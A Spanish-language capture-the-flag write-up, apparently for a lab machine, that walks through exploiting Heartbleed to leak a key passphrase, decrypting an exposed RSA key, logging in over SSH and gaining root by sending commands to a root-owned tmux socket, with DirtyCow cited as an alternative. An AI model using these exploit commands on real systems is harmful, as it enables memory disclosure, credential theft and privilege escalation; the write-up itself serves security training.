// 01

Resumen

Resumen. La web sólo sirve el logo de Heartbleed (omg.jpg), y tanto el 80 como el 443 son vulnerables a CVE-2014-0160. En /dev/ hay un listado de directorio con hype_key (una clave RSA cifrada en hexadecimal) y notes.txt que avisa de que "el encoder/decoder no debe usarse hasta arreglarlo". El volcado de Heartbleed deja ver la cadena base64 de la passphrase (heartbleedbelievethehype), con la que se descifra la clave y se entra por SSH como hype (user flag). Dentro, un tmux corre como root con el socket /.devs/dev_sess en el grupo hype: enviándole teclas se ejecutan comandos como root (root flag).

// NOTA

Versión simplificada (la usada): Heartbleed (un script de searchsploit) + openssl rsa + SSH con los flags de ssh-rsa (el servidor es de 2012) + tmux send-keys. Nada de compilar exploits.

Reconocimiento

SHELL
$ sudo nmap -sS -p- -n -Pn --min-rate 2500 --max-retries 1 --open 10.129.232.136
$ sudo nmap -sV -Pn -p22,80,443 --script ssl-heartbleed 10.129.232.136

Lo que se encontró: 22, 80 y 443. En el 443, el script ssl-heartbleed marca VULNERABLE, y la web sirve una imagen con el logo de Heartbleed *(<center><img src="omg.jpg"/></center>)*.

// 05

Heartbleed: fuga de memoria

SHELL
$ searchsploit -m 32745 # Heartbleed Memory Disclosure (Python 2)
$ python2 32745.py 10.129.232.136 -p 443

Lo que se encontró: el servidor devuelve 16 KB cuando debería devolver 3 bytes:

... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r...
WARNING: server returned more data than it should - server is vulnerable!

En los volcados aparece la memoria de procesos del servidor; entre ella, la petición al decoder con la cadena base64:

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

que decodifica a heartbleedbelievethehype.

*(En esta corrida el dump confirmó la vulnerabilidad y devolvió memoria; la cadena concreta no salió en los volcados — es memoria estática del reto y aparece "con suerte" tras muchos intentos. La passphrase se validó descifrando la clave, que es lo que importa.)*

// 06

Descifrar la clave y SSH como hype

SHELL
$ curl -sk https://10.129.232.136/dev/hype_key -o hype_key.hex
$ xxd -r -p hype_key.hex > hype_key.enc # de hex a PEM cifrado
$ head -3 hype_key.enc
# -----BEGIN RSA PRIVATE KEY-----
# Proc-Type: 4,ENCRYPTED
# DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
 
$ openssl rsa -in hype_key.enc -passin pass:heartbleedbelievethehype -out hype_key.dec
 
$ ssh -i hype_key.dec \
$ -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa \
$ hype@10.129.232.136

Lo que se encontró: shell como hype, y la user flag en /home/hype/user.txt:

[flag oculta]

Trampa: el servidor es OpenSSH 5.9 y sólo admite ssh-rsa con SHA-1; el cliente moderno lo rechaza (no mutual signature supported). Hay que reactivarlo con PubkeyAcceptedAlgorithms=+ssh-rsa y HostKeyAlgorithms=+ssh-rsa.

// 07

Root: la sesión tmux de root

SHELL
$ ps -ef | grep -i tmux
# root 1083 1 0 22:59 ? 00:00:00 /usr/bin/tmux -S /.devs/dev_sess
$ ls -l /.devs
# srw-rw---- 1 root hype 0 Oct 29 22:59 dev_sess

El socket es del grupo hype, así que cualquier usuario hype puede hablar con esa sesión, que corre como root:

SHELL
$ tmux -S /.devs/dev_sess send-keys 'cat /root/root.txt > /tmp/rflag.txt; chmod 644 /tmp/rflag.txt' Enter
$ cat /tmp/rflag.txt

Lo que se encontró: root flag [flag oculta].

*Alternativa (kernel 3.2.0-23): DirtyCow, EDB 40839 (/etc/passwd method) → usuario firefart con uid 0.*
